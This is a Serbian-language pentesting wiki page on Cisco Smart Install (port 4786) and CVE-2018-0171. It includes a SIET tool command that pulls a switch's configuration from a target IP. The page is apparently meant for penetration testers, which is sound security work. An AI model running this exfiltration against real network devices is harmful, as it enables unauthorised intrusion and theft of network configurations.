# 4786 - Cisco Smart Install

{{#include ../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnovne informacije

**Cisco Smart Install** je Cisco rešenje dizajnirano za automatizaciju inicijalne konfiguracije i učitavanje slike operativnog sistema za novi Cisco hardver. **Po defaultu, Cisco Smart Install je aktivan na Cisco hardveru i koristi transportni sloj protokola, TCP, sa brojem porta 4786.**

**Podrazumevani port:** 4786
```
PORT      STATE  SERVICE
4786/tcp  open   smart-install
```
## **Smart Install Exploitation Tool**

**U 2018. godini, otkrivena je kritična ranjivost, CVE-2018–0171, u ovom protokolu. Nivo pretnje je 9.8 na CVSS skali.**

**Posebno oblikovani paket poslat na TCP/4786 port, gde je Cisco Smart Install aktivan, izaziva prelivanje bafera, omogućavajući napadaču da:**

- prisilno restartuje uređaj
- pozove RCE
- ukrade konfiguracije mrežne opreme.

**Alat** [**SIET**](https://github.com/frostbits-security/SIET) **(Smart Install Exploitation Tool)** razvijen je za iskorišćavanje ove ranjivosti, omogućava vam da zloupotrebite Cisco Smart Install. U ovom članku ću vam pokazati kako možete pročitati legitimnu konfiguracionu datoteku mrežne opreme. Konfiguracija eksfiltracije može biti dragocena za pentestera jer će saznati o jedinstvenim karakteristikama mreže. A to će olakšati život i omogućiti pronalaženje novih vektora za napad.

**Ciljni uređaj će biti “uživo” Cisco Catalyst 2960 prekidač. Virtuelne slike nemaju Cisco Smart Install, tako da možete vežbati samo na pravom hardveru.**

Adresa ciljnog prekidača je **10.10.100.10 i CSI je aktivan.** Učitajte SIET i započnite napad. **Argument -g** znači eksfiltraciju konfiguracije sa uređaja, **argument -i** vam omogućava da postavite IP adresu ranjivog cilja.
```
~/opt/tools/SIET$ sudo python2 siet.py -g -i 10.10.100.10
```
<figure><img src="../images/image (773).png" alt=""><figcaption></figcaption></figure>

Konfiguracija prekidača **10.10.100.10** biće u **tftp/** folderu

<figure><img src="../images/image (1116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../banners/hacktricks-training.md}}
